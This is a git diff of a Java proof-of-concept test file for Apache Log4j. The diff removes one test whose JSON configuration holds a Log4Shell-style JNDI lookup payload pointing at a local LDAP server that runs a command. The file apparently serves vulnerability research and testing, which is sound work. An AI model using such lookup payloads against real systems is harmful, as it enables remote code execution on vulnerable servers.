@@ -19,9 +19,11 @@ import org.apache.logging.log4j.core.config.plugins.visitors.PluginValueVisitor;
 import org.apache.logging.log4j.core.config.plugins.visitors.PluginVisitor;
 import org.apache.logging.log4j.core.impl.MutableLogEvent;
 import org.apache.logging.log4j.core.script.Script;
+import org.apache.logging.log4j.core.util.Source;
 import org.junit.jupiter.api.Test;
 
 import java.io.ByteArrayInputStream;
+import java.io.File;
 import java.io.IOException;
 import java.lang.annotation.Annotation;
 import java.nio.charset.StandardCharsets;
@@ -59,16 +61,6 @@ public class PluginPocsTests {
         visitor.visit(configuration, node, logEvent, new StringBuilder());
     }
 
-    @Test
-    public void buildDefaultConfigurationBuilderTest() throws IOException {
-        String jsonConfig = "{\"injectedObject\": {\"injectedProperty\":\"${jndi:ldap://127.0.0.1:7777/Basic/Command/calc}\"}}";
-        ByteArrayInputStream bis = new ByteArrayInputStream(jsonConfig.getBytes(StandardCharsets.UTF_8));
-        ConfigurationSource source = new ConfigurationSource(bis);
-
-        DefaultConfigurationBuilder builder = new DefaultConfigurationBuilder<>();
-        builder.setConfigurationSource(source);
-        builder.build();
-    }
 
     @Test
     public void visitPluginBuilderAttributeVisitorTest() {
